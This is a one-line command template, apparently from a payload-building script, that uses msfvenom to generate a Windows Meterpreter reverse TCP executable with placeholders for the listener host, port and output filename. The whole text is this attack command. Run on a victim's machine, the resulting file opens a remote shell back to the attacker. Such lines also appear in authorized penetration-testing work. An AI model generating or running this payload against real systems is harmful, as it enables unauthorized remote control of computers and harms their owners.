msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {WINDOWS_FILENAME}
